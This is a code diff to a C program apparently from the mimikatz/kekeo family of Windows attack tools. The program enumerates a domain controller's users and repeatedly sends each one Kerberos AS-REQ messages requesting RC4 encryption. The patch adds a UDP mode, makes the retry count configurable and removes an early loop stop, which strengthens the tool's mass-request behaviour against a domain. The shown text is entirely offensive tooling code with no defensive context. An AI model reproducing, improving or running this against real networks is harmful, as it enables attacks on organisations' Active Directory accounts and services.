@@ -45,6 +45,7 @@ int main(int argc, char * argv[])
 {
 	BOOL sockError = FALSE;
 	DWORD retry, i, j, total, f, th, dataOutSize;
+	int mode = IPPROTO_TCP;
 	PBERVAL pBerVal = NULL;
 	KULL_M_SOCK fullsocket;
 	PVOID dataOut;
@@ -66,12 +67,19 @@ int main(int argc, char * argv[])
 		{
 			kull_m_string_args_byName(argc, argv, "retry", &szNum, "20");
 			retry = strtoul(szNum, NULL, 0);
-			kprintf("DC name    : %s\nDomain FQDN: %s\nLogon retry: %u\n\n", szDc, szDomain, retry);
-			GetSystemTimeAsFileTime(&fTime); kprintf("> Retrieving user list : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
+			kprintf("DC name    : %s\nDomain FQDN: %s\nLogon retry: %u\nMode       : ", szDc, szDomain, retry);
+			if(kull_m_string_args_byName(argc, argv, "udp", NULL, NULL))
+			{
+				mode = IPPROTO_UDP;
+				kprintf("UDP");
+			}
+			else kprintf("TCP");
+
+			GetSystemTimeAsFileTime(&fTime); kprintf("\n> Retrieving user list : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
 			if(total = giveUsersForServer(szDc))
 			{
 				GetSystemTimeAsFileTime(&fTime); kprintf("> End of user list     : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
-				if(kull_m_sock_initSocket(szDc, KERBEROS_DEFAULT_PORT, IPPROTO_TCP, &fullsocket))
+				if(kull_m_sock_initSocket(szDc, KERBEROS_DEFAULT_PORT, mode, &fullsocket))
 				{
 					GetSystemTimeAsFileTime(&fTime); kprintf("> Sending AS-REQ       : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
 					for(entry = (PKIWI_USERNAMEA) gUserList.Flink, j = 1, th = 1; !sockError && (entry != (PKIWI_USERNAMEA) &gUserList); entry = (PKIWI_USERNAMEA) entry->navigator.Flink, j++)
@@ -84,19 +92,19 @@ int main(int argc, char * argv[])
 								printf(" ");
 							if((f % 20) == 0)
 								printf("\n");
-							th++;sockError = TRUE;
+							th++;
 						}
 
 						if(pBerVal = giveBERForUser(&entry->username, szDomain))
 						{
-							for(i = 0; !sockError && (i < 30); i++)
+							for(i = 0; !sockError && (i < retry); i++)
 								if(kull_m_sock_kerberos_SendAndRecv(&fullsocket, pBerVal->bv_val, pBerVal->bv_len, &dataOut, &dataOutSize))
 									LocalFree(dataOut);
 								else sockError = TRUE;
 								ber_bvfree(pBerVal);
 						}
 					}
-					GetSystemTimeAsFileTime(&fTime); kprintf("> End of AS-REQ      : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
+					GetSystemTimeAsFileTime(&fTime); kprintf("> End of AS-REQ        : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
 					kull_m_sock_termSocket(&fullsocket);
 				}
 
@@ -158,7 +166,7 @@ PBERVAL giveBERForUser(PCANSI_STRING user, PCSTR domain)
 								MAKE_CTX_TAG(8), KERB_ETYPE_RC4_HMAC_NT
 					);
 		if(ber_flatten(pBer, &pBerVal) < 0)
-			PRINT_ERROR("ber_flatten for %s@%s\n", user, domain);
+			PRINT_ERROR("ber_flatten for %Z@%Z\n", user, domain);
 		ber_free(pBer, 1);
 	}
 	return pBerVal;
